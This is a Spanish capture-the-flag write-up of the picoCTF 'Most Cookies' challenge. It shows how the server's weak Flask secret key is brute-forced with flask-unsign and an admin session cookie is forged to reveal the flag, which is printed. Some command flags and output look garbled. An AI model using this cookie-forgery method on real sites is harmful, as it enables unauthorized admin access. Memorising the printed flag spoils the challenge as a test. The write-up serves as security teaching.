## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
[http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)
## Solución
- ##### Descargaremos el archivo "server.py".
```
┌──(kali㉿kali)-[~/picoCTF]
└─$ wget https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py
--2024-10-02 00:55:30--  https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py                    100%[============================================>]   1.97K  --.-KB/s    in 0s      

2024-10-02 00:55:31 (81.3 MB/s) - ‘server.py’ saved [2021/2021]
```

- ##### Observando el código del archivo, podemos observar que hay una lista de cookies y que la firma de la cookie se hace de forma aleatoria. También se observa que la estructura de la cookie para obtener la bandera tiene que tener "admin" para obtenerla.
``` python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```

- ##### Mediante el "pipx", instalaremos el "flask-unsign", con el que realizaremos lo siguiente en la terminal.
```
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvzbNg.OxwWYnzHHB2v_KVqDbwVLVUpIKA"   
{'very_auth': 'snickerdoodle'}
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvzbNg.OxwWYnzHHB2v_KVqDbwVLVUpIKA" --.txt
{'very_auth': 'snickerdoodle'}
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvzbNg.OxwWYnzHHB2v_KVqDbwVLVUpIKA" --.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'gingersnap'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvzcqw.zM6bMebiWfVbgehkNBDotZdsDU0
```

- ##### Una vez firmada la nueva cookie que hicimos con el "flask-unsign", la editaremos en el sitio web, y recargando la página, obtenemos la bandera.
```
Flag: picoCTF{pwn_4ll_th3_cook1E5_5f016958}
```
## Notas Adicionales
- Las cookies son pequeños fragmentos de texto que los sitios web que visitas envían al navegador. Permiten que los sitios web recuerden información sobre tu visita, lo que puede hacer que sea más fácil volver a visitar los sitios y hacer que estos te resulten más útiles.
## Referencias
- [PicoCTF](https://play.picoctf.org)